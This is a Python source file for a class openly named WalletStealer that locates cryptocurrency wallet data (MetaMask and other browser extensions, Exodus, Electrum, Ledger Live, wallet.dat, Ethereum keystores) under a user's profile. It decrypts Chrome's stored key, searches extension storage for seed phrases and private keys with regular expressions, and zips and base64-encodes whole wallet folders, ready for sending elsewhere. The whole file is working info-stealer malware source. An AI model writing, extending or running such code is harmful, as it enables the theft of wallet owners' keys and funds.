import os
import json
import shutil
import base64
from Crypto.Cipher import AES
import asyncio

class WalletStealer:
    def __init__(self):
        self.wallet_paths = {
            "MetaMask": [
                "AppData/Local/Google/Chrome/User Data/*/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
                "AppData/Local/BraveSoftware/Brave-Browser/User Data/*/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"
            ],
            "Phantom": [
                "AppData/Local/Google/Chrome/User Data/*/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"
            ],
            "Coinbase Wallet": [
                "AppData/Local/Google/Chrome/User Data/*/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"
            ],
            "Exodus": ["AppData/Roaming/Exodus"],
            "Atomic": ["AppData/Roaming/atomic"],
            "Electrum": ["AppData/Roaming/Electrum/wallets"],
            "Monero": ["AppData/Remote/monero-wallet-gui"],
            "Zcash": ["AppData/Roaming/Zcash"],
            "Ledger Live": ["AppData/Roaming/Ledger Live"],
            "Trezor Suite": ["AppData/Roaming/Trezor Suite"],
            "Binance": ["AppData/Roaming/Binance"],
            "Coinbase": ["AppData/Local/Coinbase"],
            "Wallet.dat": ["wallet.dat", "AppData/Roaming/Bitcoin/wallet.dat"],
            "Keystore": [".ethereum/keystore", "AppData/Roaming/Ethereum/keystore"]
        }
    
    async def extract_metamask_data(self, path):
        try:
            local_state_path = os.path.join(os.path.dirname(path), "..", "Local State")
            with open(local_state_path, "r") as f:
                local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            import win32crypt
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            wallets = []
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.endswith(('.ldb', '.log')):
                        full_path = os.path.join(root, file)
                        with open(full_path, 'r', errors='ignore') as f:
                            content = f.read()
                            seeds = self.extract_seeds(content)
                            private_keys = self.extract_private_keys(content)
                            
                            if seeds or private_keys:
                                wallets.append({
                                    "file": file,
                                    "seeds": seeds,
                                    "private_keys": private_keys
                                })
            return wallets
        except Exception as e:
            return f"Error: {str(e)}"
    
    def extract_seeds(self, content):
        seeds = []
        import re
        patterns = [
            r'\b(?:\w+\s+){11}\w+\b',  
            r'\b(?:\w+\s+){23}\w+\b',  
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content)
            seeds.extend(matches)
        
        return seeds
    
    def extract_private_keys(self, content):
        private_keys = []
        import re
        
        patterns = [
            r'[5KL][1-9A-HJ-NP-Za-km-z]{50,51}',  
            r'[0-9a-fA-F]{64}', 
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content)
            private_keys.extend(matches)
        
        return private_keys
    
    async def scan_all_wallets(self):
        results = {}
        user_profile = os.path.expanduser("~")
        
        for wallet_name, paths in self.wallet_paths.items():
            wallet_data = []
            
            for path_pattern in paths:
                full_pattern = os.path.join(user_profile, path_pattern)
                import glob
                matches = glob.glob(full_pattern)
                
                for match in matches:
                    if os.path.exists(match):
                        if "MetaMask" in wallet_name:
                            data = await self.extract_metamask_data(match)
                        else:
                            data = self.copy_wallet_files(match)
                        
                        wallet_data.append({
                            "path": match,
                            "data": data
                        })
            
            if wallet_data:
                results[wallet_name] = wallet_data
        
        return results
    
    def copy_wallet_files(self, path):
        try:
            if os.path.isfile(path):
                with open(path, 'rb') as f:
                    return base64.b64encode(f.read()).decode()
            else:
                import zipfile
                import tempfile
                
                temp_zip = tempfile.NamedTemporaryFile(delete=False, suffix='.zip')
                with zipfile.ZipFile(temp_zip.name, 'w') as zipf:
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            zipf.write(file_path, os.path.relpath(file_path, path))
                
                with open(temp_zip.name, 'rb') as f:
                    zip_data = base64.b64encode(f.read()).decode()
                
                os.unlink(temp_zip.name)
                return zip_data
        except Exception as e:
            return f"Error copying: {str(e)}"

async def scan_all_wallets():
    stealer = WalletStealer()
    return await stealer.scan_all_wallets()